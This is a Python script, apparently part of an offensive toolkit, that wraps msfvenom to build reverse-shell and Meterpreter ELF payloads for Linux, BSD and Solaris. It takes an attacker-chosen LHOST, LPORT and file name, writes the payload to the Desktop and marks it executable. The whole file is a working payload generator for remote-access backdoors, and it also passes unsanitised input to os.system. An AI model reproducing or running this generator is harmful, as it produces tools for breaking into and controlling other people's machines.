import os,time,sys,fileinput
#
r = "\033[91m"
g = "\033[1;32m"
y = "\033[1;33m"
b = "\033[1;34m"
d = "\033[2;37m"
R = "\033[1;41m"
Y = "\033[1;43m"
B = "\033[1;44m"
w = "\033[98m\033[00m"
#
def start():
    os.system("clear")
    os.system("python3 banner.py")
    #
    os.system("clear")
    os.system("python3 banner.py")
    print(w+"\n\n\tCreating payload for "+r+"Linux"+w+":-")
    print(w+"\n\tSelect method :-")
    print(w+b+"\n\t\t1."+w+" Linux/x86/shell_reverse_tcp")
    print(w+b+"\n\t\t2."+w+" Linux/x86/meterpreter/reverse_tcp")
    print(w+b+"\n\t\t3."+w+" bsd/x86/shell/reverse_tcp")
    print(w+b+"\n\t\t4."+w+" solaris/x86/shell_reverse_tcp")  
    x=int(input(w+b+"\n\n\t\t> "))   
    # 
    if x == 1 :
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\tCreating payload using "+w+b+"Linux/x86/shell_reverse_tcp")
      lh=input(w+"\n\tSelect the "+w+r+"LHOST"+w+y+" > ")
      lp=input(w+"\n\tSelect the "+w+r+"LPORT"+w+y+" > ")
      an=input(w+"\n\tSelect the "+w+r+"app name"+w+y+" > ")
      pl=('sudo msfvenom -p linux/x86/shell_reverse_tcp LHOST='+lh+' LPORT='+lp+' -f elf R > /$HOME/Desktop/'+an+'.elf')
      exc=('chmod +x /$HOME/Desktop/'+an+'.elf')
      print(w+"\n\n")
      os.system(pl)
      os.system(exc)
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\n\tCreated "+w+r+"payload"+w+" with the following informtions :- ")
      print("\n")
      print(w+"\n\n\tPAYLOAD = "+w+r+"Linux/x86/shell_reverse_tcp")
      print(w+"\n\tLHOST = "+w+r+lh)
      print(w+"\n\tLPORT = "+w+r+lp)
      print(w+"\n\tAPP NAME = "+w+r+an)
      print(w+r+"\n\n\tPayload"+w+" has been created and stored in your "+w+r+"DESKTOP"+w+" with the name of "+r+an+".elf"+w)
    #  
    elif x == 2 :
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\tCreating payload using "+w+b+"Linux/x86/meterpreter/reverse_tcp")
      lh=input(w+"\n\tSelect the "+w+r+"LHOST"+w+y+" > ")
      lp=input(w+"\n\tSelect the "+w+r+"LPORT"+w+y+" > ")
      an=input(w+"\n\tSelect the "+w+r+"app name"+w+y+" > ")
      pl=('sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST='+lh+' LPORT='+lp+' -f elf R > /$HOME/Desktop/'+an+'.elf')
      exc=('chmod +x /$HOME/Desktop/'+an+'.elf')
      print(w+"\n\n")
      os.system(pl)
      os.system(exc)
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\n\tCreated "+w+r+"payload"+w+" with the following informtions :- ")
      print("\n")
      print(w+"\n\n\tPAYLOAD = "+w+r+"Linux/x86/meterpreter/reverse_tcp")
      print(w+"\n\tLHOST = "+w+r+lh)
      print(w+"\n\tLPORT = "+w+r+lp)
      print(w+"\n\tAPP NAME = "+w+r+an)
      print(w+r+"\n\n\tPayload"+w+" has been created and stored in your "+w+r+"DESKTOP"+w+" with the name of "+r+an+".elf"+w)
    #    
    elif x == 3 :
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\tCreating payload using "+w+b+"Bsd/x86/shell/reverse_tcp")
      lh=input(w+"\n\tSelect the "+w+r+"LHOST"+w+y+" > ")
      lp=input(w+"\n\tSelect the "+w+r+"LPORT"+w+y+" > ")
      an=input(w+"\n\tSelect the "+w+r+"app name"+w+y+" > ")
      pl=('sudo msfvenom -p bsd/x86/shell/reverse_tcp LHOST='+lh+' LPORT='+lp+' -f elf R > /$HOME/Desktop/'+an+'.elf')
      exc=('chmod +x /$HOME/Desktop/'+an+'.elf')
      print(w+"\n\n")
      os.system(pl)
      os.system(exc)
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\n\tCreated "+w+r+"payload"+w+" with the following informtions :- ")
      print("\n")
      print(w+"\n\n\tPAYLOAD = "+w+r+"Bsd/x86/shell/reverse_tcp")
      print(w+"\n\tLHOST = "+w+r+lh)
      print(w+"\n\tLPORT = "+w+r+lp)
      print(w+"\n\tAPP NAME = "+w+r+an)
      print(w+r+"\n\n\tPayload"+w+" has been created and stored in your "+w+r+"DESKTOP"+w+" with the name of "+r+an+".elf"+w)
      #    
    elif x == 4 :
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\tCreating payload using "+w+b+"Solaris/x86/shell_reverse_tcp")
      lh=input(w+"\n\tSelect the "+w+r+"LHOST"+w+y+" > ")
      lp=input(w+"\n\tSelect the "+w+r+"LPORT"+w+y+" > ")
      an=input(w+"\n\tSelect the "+w+r+"app name"+w+y+" > ")
      pl=('sudo msfvenom -p solaris/x86/shell_reverse_tcp LHOST='+lh+' LPORT='+lp+' -f elf R > /$HOME/Desktop/'+an+'.elf')
      exc=('chmod +x /$HOME/Desktop/'+an+'.elf')
      print(w+"\n\n")
      os.system(pl)
      os.system(exc)
      os.system("clear")
      os.system("python3 bnr/banner.py")
      print(w+"\n\n\tCreated "+w+r+"payload"+w+" with the following informtions :- ")
      print("\n")
      print(w+"\n\n\tPAYLOAD = "+w+r+"Solaris/x86/shell_reverse_tcp")
      print(w+"\n\tLHOST = "+w+r+lh)
      print(w+"\n\tLPORT = "+w+r+lp)
      print(w+"\n\tAPP NAME = "+w+r+an)
      print(w+r+"\n\n\tPayload"+w+" has been created and stored in your "+w+r+"DESKTOP"+w+" with the name of "+r+an+".elf"+w)
    #  
    else :
      print(w+"\n\n\t\tThere was an "+r+"error"+w+" while choosing the options !!")
      time.sleep(5)
      os.system("python3 pld/lin.py")
#
if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        os.system("clear")
        print(r+"\n Exiting ...\n\n")
        time.sleep(3)
        os.system("clear")
        os.system("python3 banner.py")
        print(r+"\n\n[!]"+w+" Thanks for Using this tools\n\n    Follow me \033[4mhttps://github.com/Anonymous24x7\033[0m\n\n    ")
        time.sleep(3)
        exit     